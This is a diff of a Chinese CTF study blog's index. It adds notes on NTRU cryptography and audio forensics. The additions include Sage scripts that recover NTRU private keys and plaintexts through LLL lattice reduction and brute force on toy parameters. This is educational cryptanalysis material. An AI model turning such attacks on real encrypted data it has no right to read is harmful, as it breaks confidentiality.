@@ -181,10 +181,53 @@ key 即可操纵明文。</p>
     <title>NTRU密码体制笔记</title>
     <url>//NTRU-note.html</url>
     <content><![CDATA[<h1 id="ntru-原理">NTRU 原理</h1>
-<h2 id="简述">简述</h2>
 <p>NTRU
 是一种基于环与格的公钥密码系统，特点是密钥短且容易产生，算法运算速度快，所需存储空间小。</p>
-<h2 id="前提">前提</h2>
+<h2 id="格问题">格问题</h2>
+<h3 id="基本问题介绍">基本问题介绍</h3>
+<p>考虑一个简单的加密方式，随机选取素数 <span class="math inline">\(p,g\)</span>，随机数 <span class="math inline">\(f\)</span>，满足 <span class="math inline">\(g&lt;f&lt;p\)</span>，我们计算 <span class="math display">\[
+h=gf^{-1}\pmod{p}
+\]</span> 那么公钥为 <span class="math inline">\((h,p)\)</span>，私钥为
+<span class="math inline">\((f,g)\)</span>。</p>
+<p>定义加密方式为 <span class="math display">\[
+c=r\cdot h+m\pmod{p}
+\]</span> 其中，<span class="math inline">\(r\)</span> 为随机数，满足
+<span class="math inline">\(r&lt;p\)</span>。</p>
+<p>定义解密方式为 <span class="math display">\[
+c\cdot f=r\cdot g+m\cdot f\pmod{p}
+\]</span> 在这里要满足 <span class="math inline">\(rg+mf&lt;p\)</span>，那么可以得知 <span class="math display">\[
+a=rg+mf=mf\pmod{g}
+\]</span> 那么求解问题变为 <span class="math display">\[
+m=af^{-1}\pmod{g}
+\]</span></p>
+<blockquote>
+<p>在这里简化了很多步骤，比如说保证 <span class="math inline">\(\gcd(f,g)=1\)</span> 等条件，其中 <span class="math inline">\(rg+mf&lt;p\)</span> 是通过控制 <span class="math inline">\(h, p,f,g\)</span> 的大小实现的。</p>
+</blockquote>
+<p>当我们手里有密文 <span class="math inline">\(c\)</span>，公钥 <span class="math inline">\((h,p)\)</span> 时，要想破解明文，需要得知密钥
+<span class="math inline">\((f,g)\)</span>。</p>
+<h3 id="攻击手段">攻击手段</h3>
+<p>首先考虑等式 <span class="math display">\[
+h=gf^{-1}\pmod{p}
+\]</span> 对其进行变形，得到 <span class="math display">\[
+f\cdot h=g\pmod{p}=g+kp
+\]</span> 改写为矩阵乘法，得到 <span class="math display">\[
+(f,-k)M=(f,g)\newline
+M=\begin{bmatrix}
+1&amp;h\newline
+0&amp;g
+\end{bmatrix}
+\]</span> 可以证明向量 <span class="math inline">\((f,g)\)</span> 在格
+<span class="math inline">\(M\)</span> 上，即 SVP 问题。</p>
+<blockquote>
+<p>详细证明在另一篇文章中，暂不在这里讨论。</p>
+</blockquote>
+<p>一个二维格使用 LLL 算法是容易求解的。</p>
+<h3 id="生成代码">生成代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, getRandomNBitInteger</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    p = getPrime(<span class="number">2048</span>)</span><br><span class="line">    f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    g = getPrime(<span class="number">768</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(f, p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> gcd(f, g) == <span class="number">1</span></span><br><span class="line">    h = <span class="built_in">pow</span>(f, -<span class="number">1</span>, p) * g % p</span><br><span class="line">    <span class="keyword">return</span> (h, p), (f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">h, p, m</span>):</span><br><span class="line">    r = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> (r * h + m) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">f, g, c</span>):</span><br><span class="line">    a = c * f % p</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">pow</span>(f, -<span class="number">1</span>, g) % g</span><br><span class="line"></span><br><span class="line">pubkey, prikey = gen_key()</span><br><span class="line">h, p = pubkey</span><br><span class="line">f, g = prikey</span><br><span class="line">m = <span class="number">1234567890123456789012345678901234567890</span></span><br><span class="line">c = encrypt(h, p, m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;h = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="攻击代码">攻击代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">27594003389147607369876674962283540812923723484764896504615301667891769682392830700505146565378653539119600813995142280915192657472008749757053428617533851699041596289206274929457178724207236537704942588471957686793501676280083577625938001845200938875371121059921018339291926310189890910674291154395560577741025165026637266300202408364846598547810207047635737497984357341153634605326370312560794859152109470507930707976266978869848114875210278872802460387560896289447402484841694897117444468955804897349232138924990711736063541879374827091472825348941445564520557929969273920235937179897137468129678469879486475239587</span></span><br><span class="line">h = <span class="number">2071693178846115365256723483327725178503050954465496579029808248184888643303185618308763733997615320553015405690744070807211482128071409950264282977319266191487261103502555226760220546234498149656711925740338844829729591708920986465468222690445385909699330163332174162914930634801187698298857635172034342938401155529241042690638568002082750744828569527268706825896607293470070519508750808672297737672589325372550690338703159708325314400119604285890879839665019432945211057077954724304391457748178158342102678647638675140789772803542969160681336018722064996045749041652415620028221116584104045162570850741666319496552</span></span><br><span class="line">c = <span class="number">7671911440878532433667489121828814206592905285054408925890957479601943566414379514033874765501550498736499255991516070982428829754215761379185332958698647996593036343058593367027949092535270126555289066891682542858251520630282615219113992893538755011967908072085016169215108544137084022073238869205354768601011253598570094011049868057911782544371039850541623949887912456762381409507704839535353567221746097905226925531782002899815658215746488155191552172645625894574414478454147438702085549693734515817389107129970039603841526722724017093665065816242864251172298040114963542718789445480202872102034318566489282326224</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">f, g, c</span>):</span><br><span class="line">    a = c * f % p</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">pow</span>(f, -<span class="number">1</span>, g) % g</span><br><span class="line"></span><br><span class="line">M = matrix([[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">L = M.LLL()</span><br><span class="line">shortest_vector = L[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> shortest_vector &lt; <span class="number">0</span>:</span><br><span class="line">    shortest_vector = -shortest_vector</span><br><span class="line">f, g = shortest_vector</span><br><span class="line">m = decrypt(f, g, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;m = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="多项式环与格">多项式环与格</h2>
+<h3 id="多项式环">多项式环</h3>
 <ol type="1">
 <li><p>设 <span class="math inline">\(R(N)\)</span> 表示最高次数不超过
 <span class="math inline">\(N-1\)</span> 的所有整系数多项式集合，即
@@ -197,26 +240,57 @@ b=c_0+c_1x+\cdots+c_{N-1}x^{N-1}\)</span>，其中第 <span class="math inline">
 </ol>
 <p>由以上定义可知，<span class="math inline">\(R\)</span>
 的加法和乘法运算构成一个环。</p>
+<h3 id="概述">概述</h3>
+<p>基于前面的加密算法，我们不难发现破解该算法的主要核心点就在于格攻击上，如果说我们将格的维度提高，那么就很自然的提高了攻击成本。</p>
+<p>我们考虑将原本的整数环转化为多项式环，在多项式环进行相应的加解密运算，此时如果还想要对其进行攻击，就必须构建格
+<span class="math display">\[
+\mathscr{L}=\begin{bmatrix}
+\lambda I&amp;H\newline
+0&amp;qI
+\end{bmatrix}\newline
+H=\begin{bmatrix}
+h_{0} &amp; h_{1} &amp; \ldots &amp; h_{N-1} \\
+h_{N-1} &amp; h_{0} &amp; \ldots &amp; h_{N-2} \\
+\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
+h_{1} &amp; h_{2} &amp; \ldots &amp; h_{0} \\
+\end{bmatrix}
+\]</span> 其中，<span class="math inline">\(H\)</span> 是有关多项式
+<span class="math inline">\(h\)</span> 的系数循环矩阵，<span class="math inline">\(I\)</span> 为单位矩阵，<span class="math inline">\(\lambda\)</span> 为维持格大小的系数，<span class="math inline">\(q\)</span> 是 NTRU 的参数。</p>
+<p>这样很直接地增加了格的维度，使得时间复杂度显著提高，格规约结果变得不稳定，同时还能降低加密运算的复杂度（小的多项式系数照样有一定的安全强度）。</p>
 <h2 id="算法">算法</h2>
-<p>首先需要三个整数 <span class="math inline">\(N,p,q\)</span>，其中
-<span class="math inline">\(N-1\)</span> 为多项式的阶，<span class="math inline">\(\gcd(p,q)\equiv1\)</span> 且 <span class="math inline">\(q&gt;p\)</span>，且 <span class="math inline">\(L_f,L_g,L_\phi,L_m\)</span> 为 <span class="math inline">\(R(N)\)</span></p>
+<p>这样根据上面的想法，我们可以改变一下原来算法的描述。</p>
+<p>首先我们需要一些公共参数来确定多项式的阶和多项式系数的大小，并且做一定的约束。</p>
+<h3 id="公共参数">公共参数</h3>
+<ul>
+<li><span class="math inline">\(N\)</span>
+是一个素数，要求其足够大以扩展格攻击中格的维度，<span class="math inline">\(N-1\)</span>
+就是多项式环的阶，同时这也是公钥之一。</li>
+<li><span class="math inline">\(p,q\)</span> 是互素的数，且 <span class="math inline">\(q\gg p\)</span>，这是为了保证密钥中的多项式 <span class="math inline">\(f\)</span>
+可以进行正常运算，选取的大小可以偏小，但不能太小（<span class="math inline">\(p\)</span> 一般选择 3，<span class="math inline">\(q\)</span> 一般选取 2 的倍数，例如 65536）。</li>
+<li>向量空间 <span class="math inline">\(L_f,L_g,L_r,L_m\)</span> 为
+<span class="math inline">\(R(N)\)</span>。</li>
+</ul>
 <h3 id="密钥生成">密钥生成</h3>
 <ol type="1">
-<li><p>随机选取两个多项式 <span class="math inline">\(f,g\in
-L_g\)</span>，其中多项式 <span class="math inline">\(f\)</span> 在模
-<span class="math inline">\(p\)</span> 和 模 <span class="math inline">\(q\)</span> 下均可逆，其逆元分别表示为 <span class="math inline">\(F_p,F_q\)</span>，即满足 <span class="math display">\[
-F_p\cdot f\equiv1\pmod{p}\\F_q\cdot f\equiv1\pmod{q}
+<li><p>随机选取两个多项式 <span class="math inline">\(f\in L_f,g\in
+L_g\)</span>，其中保证多项式 <span class="math inline">\(f\)</span> 在模
+<span class="math inline">\(p\)</span> 和模 <span class="math inline">\(q\)</span>​ 下均可逆，其逆元分别表示为 <span class="math inline">\(f_p,f_q\)</span>，即满足 <span class="math display">\[
+f_p\cdot f\equiv1\pmod{p}\newline
+f_q\cdot f\equiv1\pmod{q}
 \]</span></p></li>
-<li><p>计算 <span class="math inline">\(h\equiv F_q\cdot
+<li><p>计算 <span class="math inline">\(h\equiv f_q\cdot
 g\pmod{q}\)</span></p></li>
-<li><p>以 <span class="math inline">\(h\)</span> 作为公钥， <span class="math inline">\(f\)</span> 作为密钥，但密文接收方需要保存 <span class="math inline">\(F_q\)</span></p></li>
+<li><p>那么公钥为 <span class="math inline">\((h,N)\)</span>，私钥为
+<span class="math inline">\((f,g)\)</span></p></li>
 </ol>
 <h3 id="加密">加密</h3>
 <ol type="1">
-<li><p>设 <span class="math inline">\(m\)</span> 为消息，有多项式 <span class="math inline">\(\phi\in L_\phi\)</span></p></li>
+<li><p>将信息映射到 <span class="math inline">\(L_m\)</span> 上，定义为
+<span class="math inline">\(m\in L_m\)</span></p></li>
+<li><p>随机选取 <span class="math inline">\(r\in L_r\)</span></p></li>
 <li><p>用公钥 <span class="math inline">\(h\)</span>
-对消息进行加密（这里有可能并不会与 <span class="math inline">\(p\)</span> 相乘，而是计算 <span class="math inline">\(h\)</span> 时相乘）： <span class="math display">\[
-e\equiv p\phi\cdot h+m\pmod{q}
+对消息进行加密（这里有可能并不会与 <span class="math inline">\(p\)</span> 相乘，而是计算 <span class="math inline">\(h=p\cdot f_q\cdot g\pmod{q}\)</span>）： <span class="math display">\[
+e\equiv p\cdot r\cdot h+m\pmod{q}
 \]</span></p></li>
 <li><p><span class="math inline">\(e\)</span> 即为密文</p></li>
 </ol>
@@ -225,23 +299,30 @@ e\equiv p\phi\cdot h+m\pmod{q}
 <li>计算 <span class="math inline">\(a\equiv f\cdot
 e\pmod{q}\)</span>，其中 <span class="math inline">\(a\)</span>
 的系数选在 <span class="math inline">\(\displaystyle(-\frac{q}{2},\frac{q}{2})\)</span>
-区间内</li>
-<li>计算 <span class="math inline">\(m=F_P\cdot a\pmod{p}\)</span></li>
+区间内，平衡系数方便计算。</li>
+<li>计算 <span class="math inline">\(m=f_p\cdot a\pmod{p}\)</span></li>
 </ol>
+<h3 id="代码实现">代码实现</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">Zx = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = Zx.gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g, R</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % R</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">balancedmod</span>(<span class="params">f, q, R</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: ((x + q//<span class="number">2</span>) % q) - q//<span class="number">2</span>, f.<span class="built_in">list</span>()))</span><br><span class="line">    <span class="keyword">return</span> Zx(g) % R</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_poly</span>(<span class="params">n, d1, d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> d1 + d2 &lt;= n</span><br><span class="line">    result = d1 * [<span class="number">1</span>] + d2 * [-<span class="number">1</span>] + (n - d1 - d2) * [<span class="number">0</span>]</span><br><span class="line">    shuffle(result)</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_poly_mod_prime</span>(<span class="params">f, R, p</span>):</span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(R)</span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_poly_mod_powerof2</span>(<span class="params">f, R, q</span>):  <span class="comment"># Hensel Lemma </span></span><br><span class="line">    g = invert_poly_mod_prime(f, R, <span class="number">2</span>)</span><br><span class="line">    e = log(q, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        g = ((<span class="number">2</span> * g - f * g ** <span class="number">2</span>) % R) % q</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NTRUCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, N, p, q, d</span>):</span><br><span class="line">        self.N = N</span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line">        self.d = d</span><br><span class="line">        self.R = x ** N - <span class="number">1</span></span><br><span class="line">        <span class="comment"># key generation</span></span><br><span class="line">        self.g = random_poly(self.N, d, d)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.f = random_poly(self.N, d + <span class="number">1</span>, d)</span><br><span class="line">                self.fp = invert_poly_mod_prime(self.f, self.R, self.p)</span><br><span class="line">                self.fq = invert_poly_mod_powerof2(self.f, self.R, self.q)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">		<span class="comment"># 这里在计算公钥时就已经乘以p了</span></span><br><span class="line">        self.h = balancedmod(self.p * convolution(self.fq, self.g, self.R), self.q, self.R)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPubKey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.h</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, m</span>):</span><br><span class="line">        r = random_poly(self.N, self.d, self.d)</span><br><span class="line">        <span class="comment"># 在这里并没有乘以p是因为公钥计算时已经乘进去了</span></span><br><span class="line">        <span class="keyword">return</span> balancedmod(convolution(self.h, r, self.R) + m, self.q, self.R)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, c</span>):</span><br><span class="line">        a = balancedmod(convolution(c, self.f, self.R), self.q, self.R)</span><br><span class="line">        <span class="keyword">return</span> balancedmod(convolution(a, self.fp, self.R), self.p, self.R)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, val</span>):</span><br><span class="line">        poly = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.N):</span><br><span class="line">            poly += ((val % self.p) - self.p // <span class="number">2</span>) * (x ** i)</span><br><span class="line">            val //= self.p</span><br><span class="line">        <span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, poly</span>):</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        ll = poly.<span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ll):</span><br><span class="line">            result += (val + self.p // <span class="number">2</span>) * (self.p ** idx)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poly_from_list</span>(<span class="params">self, l: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="keyword">return</span> Zx(l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    N = <span class="number">100</span></span><br><span class="line">    d = <span class="number">3</span></span><br><span class="line">    p = <span class="number">3</span></span><br><span class="line">    q = <span class="number">512</span></span><br><span class="line">    flag = <span class="string">b&#x27;flag&#123;qsdz_yyds&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    cipher = NTRUCipher(N, p, q, d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[PubKey]---------&quot;</span>)</span><br><span class="line">    h = cipher.getPubKey()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;h = &#125;</span>&#x27;</span>)</span><br><span class="line">    msg = bytes_to_long(flag)</span><br><span class="line">    encode_msg = cipher.encode(msg)</span><br><span class="line">    e = cipher.encrypt(encode_msg)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[Cipher]---------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line">    mm = cipher.decrypt(e)</span><br><span class="line">    decode_msg = cipher.decode(mm)</span><br><span class="line">    <span class="keyword">assert</span> decode_msg == msg</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 <h3 id="解密原理">解密原理</h3>
 <p><span class="math display">\[
 \begin{align*}
 a&amp;\equiv f\cdot e\\
-&amp;\equiv f\cdot p\phi+f\cdot m\pmod{q}\\
-&amp;\equiv f\cdot p\phi \cdot F_qg+f\cdot m\pmod{q}\\
-&amp;\equiv p\phi\cdot g+f\cdot m\pmod{q}
+&amp;\equiv f\cdot p\cdot r+f\cdot m\pmod{q}\\
+&amp;\equiv f\cdot p\cdot r \cdot f_qg+f\cdot m\pmod{q}\\
+&amp;\equiv p\cdot r\cdot g+f\cdot m\pmod{q}
 \end{align*}
 \]</span></p>
 <p>其中 <span class="math inline">\(a\)</span> 的系数选在 <span class="math inline">\(\displaystyle(-\frac{q}{2},\frac{q}{2})\)</span>
 区间内，故 <span class="math display">\[
-m=F_p\cdot a\equiv F_p\cdot p\phi\cdot g+F_p\cdot f\cdot m\pmod{p}\equiv
-m\pmod{p}
+m=f_p\cdot a\equiv f_p\cdot p\cdot r\cdot g+f_p\cdot f\cdot
+m\pmod{p}\equiv m\pmod{p}
 \]</span></p>
+<h3 id="格攻击">格攻击</h3>
+<p>如概述所说，我们需要构建一个格来对其进行攻击，当 <span class="math inline">\(N\)</span> 较小时，可以很轻松地进行攻击，可以证明
+<span class="math inline">\((f_0,\cdots,f_N,g_0,\cdots,g_N)\)</span>
+在格上。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">7</span></span><br><span class="line">d = <span class="number">2</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果h=p*g*fp，那么这里需要乘以p的逆元</span></span><br><span class="line">hbar = Zx(h * <span class="built_in">pow</span>(p, -<span class="number">1</span>, q))</span><br><span class="line">H = matrix.circulant(hbar.padded_list(N))</span><br><span class="line">E = matrix.identity(N)</span><br><span class="line">Q = q * E</span><br><span class="line">M = matrix.block([E, H, <span class="number">0</span>, Q], nrows=<span class="number">2</span>)</span><br><span class="line">L = M.LLL()</span><br><span class="line"></span><br><span class="line">cipher = NTRUCipher(N, p, q, d)</span><br><span class="line">possible_ms = []</span><br><span class="line"><span class="keyword">for</span> shortest_vector <span class="keyword">in</span> L:</span><br><span class="line">    shortest_vector = shortest_vector % p</span><br><span class="line">    f_coefficients = shortest_vector[:N]</span><br><span class="line">    g_coefficients = shortest_vector[N:]</span><br><span class="line">    f = Zx(<span class="built_in">list</span>(f_coefficients))</span><br><span class="line">    g = Zx(<span class="built_in">list</span>(g_coefficients))</span><br><span class="line">    cipher.f = f</span><br><span class="line">    possible_ms.append(cipher.decrypt(e))</span><br><span class="line"><span class="built_in">print</span>(possible_ms)</span><br></pre></td></tr></table></figure>
 <h1 id="ntru-求解">NTRU 求解</h1>
 <h2 id="明文爆破">明文爆破</h2>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># parameters</span></span><br><span class="line">N = <span class="number">10</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">512</span></span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q&gt;(<span class="number">6</span>*d+<span class="number">1</span>)*p</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#d1 1s and #d2 -1s</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">d1, d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1+d2</span><br><span class="line">    s = [<span class="number">1</span>]*d1 + [-<span class="number">1</span>]*d2 + [<span class="number">0</span>]*(N-d1-d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertModPrime</span>(<span class="params">f, p</span>):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^N-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">liftMod</span>(<span class="params">f, q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polyMod</span>(<span class="params">f, q</span>):</span><br><span class="line">    g = [f[i]%q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)]</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertModPow2</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertModPrime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = liftMod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = liftMod(convolution(g,<span class="number">2</span> - r),q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genMessage</span>():</span><br><span class="line">    result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> R(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>():</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      f = T(d+<span class="number">1</span>, d)</span><br><span class="line">      g = T(d, d)</span><br><span class="line">      Fp = polyMod(invertModPrime(f, p), p)</span><br><span class="line">      Fq = polyMod(invertModPow2(f, q), q)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">  h = polyMod(convolution(Fq, g), q)</span><br><span class="line">  <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = liftMod(p*convolution(h, T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">h, secret = genKey()</span><br><span class="line">m = genMessage()</span><br><span class="line">e = encrypt(m, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h = %s&#x27;</span> % h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %s&#x27;</span> % e)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(-<span class="number">1</span>, p), repeat=N):</span><br><span class="line">    i = <span class="built_in">list</span>(i)</span><br><span class="line">    m = R(i)</span><br><span class="line">    <span class="keyword">if</span> encrypt(m, h) == e:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">sha3 = SHA3_256.new()</span><br><span class="line">sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">key = sha3.digest()</span><br><span class="line"></span><br><span class="line">cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">c = cypher.encrypt(pad(flag, <span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %s&#x27;</span> % c)</span><br></pre></td></tr></table></figure>
@@ -1413,6 +1494,17 @@ y=(-bx&#39;+y)mod(N)
     <content><![CDATA[<h1 id="音频取证">音频取证</h1>
 <h2 id="简述">简述</h2>
 <p>音频同样也是一个可以隐写其他数据的数据格式，常见的例如 lsb 隐写。</p>
+<h2 id="audacity">Audacity</h2>
+<p>Audacity
+是一款优秀的音频分析软件，可以进行录制、编辑、可视化音轨等操作。</p>
+<p>在 Audacity
+中可以查看频谱图，以便于寻找是否存在频谱图隐写的操作（同时可以尝试修改采样率，以便获取更多的信息）。</p>
+<p>如果想要导入 mp4 等多媒体流的音频流，需要为 Audacity 下载额外的
+FFmpeg 库，注意需要根据不同的版本号选择对应的库：<a href="https://lame.buanzo.org/ffmpeg.php">https://lame.buanzo.org/ffmpeg.php</a>。</p>
+<blockquote>
+<p>优先选择 exe 安装文件，并默认安装路径，否则 Audacity
+可能无法正常识别。</p>
+</blockquote>
